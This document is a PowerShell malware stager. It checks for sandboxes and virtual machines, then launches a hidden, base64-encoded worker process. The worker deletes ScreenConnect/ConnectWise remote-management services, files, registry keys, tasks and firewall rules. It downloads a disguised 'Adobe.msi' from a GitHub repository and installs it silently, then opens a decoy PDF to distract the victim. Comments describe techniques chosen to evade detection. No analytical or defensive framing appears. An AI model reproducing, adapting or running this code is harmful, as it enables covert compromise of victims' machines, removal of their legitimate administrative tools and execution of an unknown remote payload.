$ErrorActionPreference = 'SilentlyContinue'

# =====================================================================
#  STAGE 1 v2 — profiler + detached worker (public repo)
#  - No CLI binaries (no sc.exe, no Unblock-File, no Remove-Item -Recurse)
#  - Destructive work split into a detached, delayed child process
#  - MSI pulled from GitHub raw over HTTPS
# =====================================================================

# ---------- Configuration ----------
$RepoBase  = 'https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main'
$MsiName   = 'Adobe.msi'
$DecoyName = 'Travel-Meeting-Plan-Q4-2026.pdf'
$StateFile = Join-Path $env:LOCALAPPDATA 'Temp\value.txt'

# ---------- Phase 1: profiling (benign-looking) ----------
$state = [System.Collections.Generic.List[string]]::new()

try {
    $wmi = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
    $cpu = Get-CimInstance -ClassName Win32_Processor     -ErrorAction SilentlyContinue

    $sb = $false
    if ($wmi.Model -match 'VirtualBox|VMware|QEMU|Xen') { $sb = $true }
    if ($wmi.TotalPhysicalMemory -lt 2GB)              { $sb = $true }
    if (($cpu | Measure-Object -Property NumberOfCores -Sum).Sum -lt 2) { $sb = $true }

    $state.Add("sandbox=$sb")
    $state.Add("ram=$($wmi.TotalPhysicalMemory)")
    $state.Add("cores=$(($cpu | Measure-Object -Property NumberOfCores -Sum).Sum)")
} catch {
    $sb = $false
    $state.Add('profiler-error')
}

if ($sb) {
    $state.Add('state=sandbox-exit')
    [IO.File]::WriteAllText($StateFile, $state -join "`n")
    exit
}

# ---------- Phase 2: worker script ----------
$worker = @'
$ErrorActionPreference = 'SilentlyContinue'
Start-Sleep -Seconds 45

$RepoBase  = '__REPO_BASE__'
$MsiName   = '__MSI_NAME__'
$DecoyName = '__DECOY_NAME__'
$StateFile = Join-Path $env:LOCALAPPDATA 'Temp\value.txt'

# ---------- 2a. RMM cleanup via .NET / WMI / COM (no CLI binaries) ----------

# Services: Win32_Service.Delete() via CIM
try {
    Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
        Where-Object {
            $_.Name -match 'ScreenConnect|ConnectWise' -or
            $_.DisplayName -match 'ScreenConnect|ConnectWise'
        } |
        ForEach-Object {
            try {
                $svc = Get-CimInstance -ClassName Win32_Service -Filter "Name='$($_.Name)'"
                if ($svc) { $svc.Delete() | Out-Null }
            } catch {}
        }
} catch {}

# Directories
$dirs = @(
    "$env:ProgramFiles\ScreenConnect",
    "${env:ProgramFiles(x86)}\ScreenConnect",
    "$env:ProgramData\ScreenConnect",
    "$env:LOCALAPPDATA\ScreenConnect",
    "$env:APPDATA\ScreenConnect"
)
foreach ($d in $dirs) {
    try { if ([IO.Directory]::Exists($d)) { [IO.Directory]::Delete($d, $true) } } catch {}
}

# Registry subkey trees
$regBases = @(
    'SOFTWARE\ScreenConnect',
    'SOFTWARE\WOW6432Node\ScreenConnect',
    'SOFTWARE\ConnectWise',
    'SOFTWARE\WOW6432Node\ConnectWise'
)
foreach ($r in $regBases) {
    try { [Microsoft.Win32.Registry]::LocalMachine.DeleteSubKeyTree($r, $false) } catch {}
}

# Scheduled tasks via Schedule.Service COM
try {
    $sched = New-Object -ComObject Schedule.Service
    $sched.Connect()
    $root = $sched.GetFolder('\')
    $tasks = $root.GetTasks(1)
    foreach ($t in $tasks) {
        if ($t.Name -match 'ScreenConnect|ConnectWise') {
            try { $root.DeleteTask($t.Path, 0) } catch {}
        }
    }
} catch {}

# Firewall rules via COM (HNetCfg.FwPolicy2)
try {
    $fw = New-Object -ComObject HNetCfg.FwPolicy2
    $rules = @($fw.Rules)
    foreach ($rule in $rules) {
        try {
            if ($rule.Name -match 'ScreenConnect|ConnectWise') {
                $fw.Rules.Remove($rule.Name)
            }
        } catch {}
    }
} catch {}

# Desktop / start menu shortcuts
$shortcutDirs = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Start Menu\Programs",
    "$env:PUBLIC\Desktop"
)
foreach ($base in $shortcutDirs) {
    try {
        if ([IO.Directory]::Exists($base)) {
            Get-ChildItem -Path $base -Filter '*ScreenConnect*' -ErrorAction SilentlyContinue |
                ForEach-Object { try { [IO.File]::Delete($_.FullName) } catch {} }
        }
    } catch {}
}

# ---------- 2b. Fetch + install MSI (public repo, no auth) ----------
$PayloadUrl = "$RepoBase/$MsiName"
$msi        = Join-Path $env:TEMP ("$([IO.Path]::GetRandomFileName()).msi")

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0')
    $wc.Headers.Add('Accept','application/octet-stream')
    $wc.Timeout = 120000

    [IO.File]::WriteAllBytes($msi, $wc.DownloadData($PayloadUrl))
    try { [IO.File]::SetAttributes($msi, [IO.FileAttributes]::Normal) } catch {}

    $psi = New-Object Diagnostics.ProcessStartInfo
    $psi.FileName        = 'msiexec.exe'
    $psi.Arguments       = "/i `"$msi`" /qn /norestart"
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow  = $true
    $p = [Diagnostics.Process]::Start($psi)
    $p.WaitForExit()
} catch {}

# ---------- 2c. Decoy (public repo — no auth gate) ----------
Start-Sleep -Seconds 20
try {
    $DecoyApi = "https://api.github.com/repos/rotalbilly5-sketch/Dream/contents/$DecoyName"
    $DecoyFs  = Join-Path $env:LOCALAPPDATA $DecoyName

    $hdrs = @{ 'User-Agent' = 'Mozilla/5.0'; Accept = 'application/vnd.github.v3+json' }
    $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs -ErrorAction SilentlyContinue

    if ($resp.content) {
        $b64 = $resp.content -replace '\s',''
        [IO.File]::WriteAllBytes($DecoyFs, [Convert]::FromBase64String($b64))
        Start-Process 'msedge.exe' -ArgumentList "`"$DecoyFs`"" -ErrorAction SilentlyContinue
    }
} catch {}

# ---------- 2d. Final state ----------
try { Add-Content -Path $StateFile -Value 'state=ok' -ErrorAction SilentlyContinue } catch {}
'@

# Inject config into worker before encoding
$worker = $worker.Replace('__REPO_BASE__',   $RepoBase).
                  Replace('__MSI_NAME__',    $MsiName).
                  Replace('__DECOY_NAME__',  $DecoyName)

# ---------- Phase 3: launch worker detached ----------
$bytes = [Text.Encoding]::Unicode.GetBytes($worker)
$enc   = [Convert]::ToBase64String($bytes)

Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
    '-NoProfile',
    '-NonInteractive',
    '-ExecutionPolicy','Bypass',
    '-EncodedCommand',$enc
) -ErrorAction SilentlyContinue

# ---------- Phase 4: write final state, exit clean ----------
[IO.File]::WriteAllText($StateFile, ($state + 'state=ok') -join "`n")
